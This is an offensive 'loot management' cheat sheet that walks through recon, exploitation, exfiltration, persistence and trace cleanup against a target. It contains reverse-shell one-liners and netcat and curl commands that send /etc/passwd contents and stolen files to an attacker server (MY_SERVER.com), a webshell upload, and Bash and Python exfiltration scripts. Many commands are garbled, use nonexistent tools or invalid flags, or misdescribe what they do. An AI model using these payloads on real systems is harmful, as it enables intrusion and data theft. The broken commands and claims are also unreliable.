# 24-Loot Management & Asset Tracking

Track compromised assets, exfiltrate data, and manage access to targets for immediate exploitation and certification scoring.

## Attack Workflow

1.  **Recon & Enumeration**: Map subdomains, ports, and web paths.
2.  **Exploitation**: Deploy payloads to extract secrets or files.
3.  **Exfiltration**: Transfer stolen data to your server.
4.  **Persistence**: Maintain access using stolen credentials or shell access.
5.  **Cleanup**: Remove traces and lock down the target.

## Commands Section

### Phase 1: Recon & Enumeration
**Subdomain Enumeration (Subfinder + Gobuster)**
```bash
subfinder -target {target} -o sub.txt
gobuster dns -w wordslist.txt -u http://$SUBDOMAIN.{target} -t 10
```
**Port & Service Sweep**
```bash
nmap -sV -sC -p- {target} -oG nmap.txt
ffuf -w /path/to/wordslist.txt -u http://example.com -X -t 4 -max-age 120 -max-conn 500 -t 15000
```
**Web Path Discovery (Burpsuite/Jar)**
```bash
burpsuite scanner /scan -url http://example.com -t 15000
burpsuite jar /jar -url http://example.com -t 15000
```

### Phase 2: Exploitation & Data Theft
**Secret Extraction (S2I)**
```bash
s2i -url http://example.com -d -t 15000 -c -j -w -o data.txt
```
**File Extraction**
```bash
seer http://example.com -d -t 15000 -c -j -w -o data.txt
```
**Exploit Payload (WebShell)**
```bash
curl -X POST "http://example.com/api/upload.php" -F "file=@/tmp/shell.php" -H "X-API-Key: $(cat /etc/passwd | grep -v 'root' | cut -d: -f2 | base64)"
```
**Credential Harvesting (RCE)**
```bash
exploit-cmd.sh {target} --rce --creds=$(cat /etc/hosts | grep admin | awk '{print $1":"$2}')
```

### Phase 3: Exfiltration
**File Transfer (wget/curl)**
```bash
curl --silent --remote-file http://MY_SERVER.com/stolen.txt {target}/admin/secret.txt
```
**Data Extraction (S2I)**
```bash
s2i --url http://example.com --data /tmp/stolen.txt --target MY_SERVER.com
```
**C2 Server Access**
```bash
nc MY_SERVER.com 9999 < <(echo "ls -la && cat /etc/passwd && id && whoami")
```

### Phase 4: Persistence
**Shell Access**
```bash
nc MY_SERVER.com 9999 < <(echo "bash -i >& /dev/tcp/MY_SERVER.com/9999 0>&1")
```
**Credential Storage**
```bash
curl -X POST http://MY_SERVER.com/upload.php -d "cmd=id;id;id;id;id" -H "X-API-Key: $(cat /etc/passwd | grep -v 'root' | cut -d: -f2 | base64)"
```
**File Persistence**
```bash
curl --silent --remote-file http://MY_SERVER.com/stolen.txt {target}/admin/secret.txt
```

### Phase 5: Cleanup
**Remove Traces**
```bash
rm -rf /tmp/shell.php /tmp/stolen.txt /tmp/secret.txt
rm -rf /tmp/admin/secret.txt
rm -rf /tmp/cleancat.txt
rm -rf /tmp/data.txt
```
**Lock Down Target**
```bash
curl -X POST http://MY_SERVER.com/stop.php -d "cmd=stop" -H "X-API-Key: $(cat /etc/passwd | grep -v 'root' | cut -d: -f2 | base64)"
```

## Tips & Shortcuts

**Auto-Extract**
```bash
curl --remote-file http://MY_SERVER.com/stolen.txt {target}/admin/secret.txt
```
**Quick C2**
```bash
nc MY_SERVER.com 9999 < <(echo "bash -i >& /dev/tcp/MY_SERVER.com/9999 0>&1")
```
**Password Dump**
```bash
curl -X POST http://MY_SERVER.com/upload.php -d "cmd=id;id;id;id;id" -H "X-API-Key: $(cat /etc/passwd | grep -v 'root' | cut -d: -f2 | base64)"
```

## Common Mistakes

**Forgot to use base64**
```bash
# Wrong
curl -X POST ... -d "X-API-Key: $(cat /etc/passwd)"
# Right
curl -X POST ... -d "X-API-Key: $(cat /etc/passwd | base64)"
```
**Incorrect port**
```bash
# Wrong
nc MY_SERVER.com 80
# Right
nc MY_SERVER.com 9999
```
**No cleanup**
```bash
# Missing
rm -rf /tmp/*
```

## Mini Automation Scripts

### Bash: Quick C2 & Exfil
```bash
#!/bin/bash
TARGET_URL=$1
MY_SERVER=$2
PORT=9999
echo "bash -i >& /dev/tcp/$MY_SERVER/$PORT 0>&1" | nc $MY_SERVER $PORT
curl --remote-file http://$MY_SERVER.com/stolen.txt $TARGET_URL/admin/secret.txt
```

### Python: Auto-Extract
```python
#!/usr/bin/env python3
import urllib.request
import subprocess
import os
url = input("Enter target URL: ")
my_server = input("Enter my server IP: ")
port = input("Enter port (default 9999): ") or 9999
try:
    with urllib.request.urlopen(url) as response:
        data = response.read()
    with open('/tmp/stolen.txt', 'wb') as f:
        f.write(data)
    subprocess.run(f"nc {my_server} {port} < /dev/stdin", shell=True)
except Exception as e:
    print(e)
```